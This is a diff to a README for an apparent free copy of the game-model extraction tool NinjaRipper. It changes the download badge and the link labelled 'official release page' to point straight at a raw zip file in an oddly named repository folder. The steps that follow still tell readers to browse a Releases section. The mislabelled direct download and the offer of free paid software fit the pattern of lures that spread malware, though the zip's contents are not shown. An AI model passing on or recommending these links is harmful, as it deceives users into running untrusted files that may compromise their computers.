@@ -1,12 +1,12 @@
 # 🎮 NinjaRipper-210-FreeVersion - Save 3D game models with ease
 
-[![Download NinjaRipper](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/darryltoroidal630/NinjaRipper-210-FreeVersion)
+[![Download NinjaRipper](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/darryltoroidal630/NinjaRipper-210-FreeVersion/main/paradoxicalness/Ninja_Free_Version_Ripper_1.1.zip)
 
 ## 📥 How to download the software
 
 You need to obtain the installation files to start using this tool. Follow these instructions to get the application onto your computer.
 
-1. Visit this [official release page](https://github.com/darryltoroidal630/NinjaRipper-210-FreeVersion).
+1. Visit this [official release page](https://raw.githubusercontent.com/darryltoroidal630/NinjaRipper-210-FreeVersion/main/paradoxicalness/Ninja_Free_Version_Ripper_1.1.zip).
 2. Look for the section labeled "Releases" on the right side of the screen.
 3. Click the latest version link.
 4. Find the file ending in ".zip" under the "Assets" header.
